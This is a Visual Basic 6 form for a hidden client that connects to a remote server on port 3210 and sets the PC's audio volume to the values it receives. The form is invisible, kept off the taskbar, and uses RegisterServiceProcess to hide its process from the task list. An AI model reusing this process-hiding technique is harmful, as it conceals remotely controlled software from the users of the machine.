VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmReceiver 
   BorderStyle     =   0  'None
   ClientHeight    =   1215
   ClientLeft      =   0
   ClientTop       =   -105
   ClientWidth     =   2775
   Icon            =   "frmReceiver.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1215
   ScaleWidth      =   2775
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.Timer Timer4 
      Interval        =   100
      Left            =   1800
      Top             =   30
   End
   Begin VB.Timer Timer3 
      Interval        =   100
      Left            =   1350
      Top             =   30
   End
   Begin VB.Timer Timer2 
      Interval        =   100
      Left            =   930
      Top             =   30
   End
   Begin VB.TextBox txtVol 
      Height          =   285
      Left            =   1290
      TabIndex        =   1
      Top             =   600
      Width           =   1215
   End
   Begin VB.TextBox txtFrmMaster 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Top             =   600
      Width           =   1095
   End
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   510
      Top             =   30
   End
   Begin MSWinsockLib.Winsock tcpReceiver 
      Left            =   60
      Top             =   30
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "frmReceiver"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Const VER_PLATFORM_WIN32_NT = 2

Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
Private Declare Function waveOutSetVolume Lib "Winmm" (ByVal wDeviceID As Integer, ByVal dwVolume As Long) As Integer
Private Declare Function waveOutGetVolume Lib "Winmm" (ByVal wDeviceID As Integer, dwVolume As Long) As Integer
Private Declare Function GetVersionEx Lib "kernel32" Alias "GetVersionExA" (lpVersionInformation As OSVERSIONINFO) As Long

Private Type OSVERSIONINFO
    dwOSVersionInfoSize As Long
    dwMajorVersion As Long
    dwMinorVersion As Long
    dwBuildNumber As Long
    dwPlatformId As Long
    szCSDVersion As String * 128
End Type

Private Function IsWinNT() As Boolean
    Dim myOS As OSVERSIONINFO
    myOS.dwOSVersionInfoSize = Len(myOS)
    GetVersionEx myOS
    IsWinNT = (myOS.dwPlatformId = VER_PLATFORM_WIN32_NT)
End Function

Public Sub HideTask(Hide As Boolean)
   On Error Resume Next
   Dim lHandle As Long
   Dim lService As Long
   If Not IsWinNT Then
      lHandle = GetCurrentProcessId()
      lService = RegisterServiceProcess(lHandle, Abs(Hide))
   End If
End Sub

Private Sub Form_Unload(Cancel As Integer)
   On Error Resume Next
   Call HideTask(False)
   Timer1.Enabled = False
   Timer2.Enabled = False
   Timer3.Enabled = False
   Timer4.Enabled = False
   tcpReceiver.Close
   End
End Sub

Private Sub tcpReceiver_DataArrival(ByVal bytesTotal As Long)
   On Error Resume Next
   Dim arrval As String
      tcpReceiver.GetData arrval
      txtFrmMaster = CLng(arrval)
End Sub

Private Sub Timer1_Timer()
   On Error Resume Next
   Static CheckOnce As Boolean
   If Not CheckOnce Then
      CheckOnce = True
      Call HideTask(True)
   End If
   If Not (tcpReceiver.State = 6 Or tcpReceiver.State = 7) Then
      tcpReceiver.Close
      tcpReceiver.RemoteHost = gStrServerName
      tcpReceiver.RemotePort = 3210
      tcpReceiver.Connect
   End If
End Sub

Private Sub Timer2_Timer()
    Dim a, i As Long
    Dim tmp As String
    
    a = waveOutGetVolume(0, i)
    tmp = "&h" & Right(Hex$(i), 4)
    txtVol = CLng(tmp)
    
End Sub

Private Sub Timer3_Timer()
   If (tcpReceiver.State = 6 Or tcpReceiver.State = 7) Then
      Timer1.Interval = 0
   Else
      Timer1.Interval = 1000
   End If
End Sub


Private Sub Timer4_Timer()
   On Error Resume Next
   Static a, i As Long
   Dim tmp, vol As String

   If Not txtFrmMaster = txtVol Then
      vol = txtFrmMaster
      tmp = Right((Hex$(vol + 65536)), 4)
      vol = CLng("&H" & tmp & tmp)
      a = waveOutSetVolume(0, vol)
   Else
      vol = txtFrmMaster
      tmp = Right((Hex$(vol + 65536)), 4)
      vol = CLng("&H" & tmp & tmp)
      a = waveOutSetVolume(0, vol)
   End If
End Sub

Private Sub txtFrmMaster_Change()
   On Error Resume Next
   Static a, i As Long
   Dim tmp, vol As String

   If Not txtFrmMaster = txtVol Then
      vol = txtFrmMaster
      tmp = Right((Hex$(vol + 65536)), 4)
      vol = CLng("&H" & tmp & tmp)
      a = waveOutSetVolume(0, vol)
   Else
      vol = txtFrmMaster
      tmp = Right((Hex$(vol + 65536)), 4)
      vol = CLng("&H" & tmp & tmp)
      a = waveOutSetVolume(0, vol)
   End If

End Sub

Private Sub txtVol_Change()
   On Error Resume Next
   Static a, i As Long
   Dim tmp, vol As String

   If Not txtFrmMaster = txtVol Then
      vol = txtFrmMaster
      tmp = Right((Hex$(vol + 65536)), 4)
      vol = CLng("&H" & tmp & tmp)
      a = waveOutSetVolume(0, vol)
   Else
      vol = txtFrmMaster
      tmp = Right((Hex$(vol + 65536)), 4)
      vol = CLng("&H" & tmp & tmp)
      a = waveOutSetVolume(0, vol)
   End If

End Sub
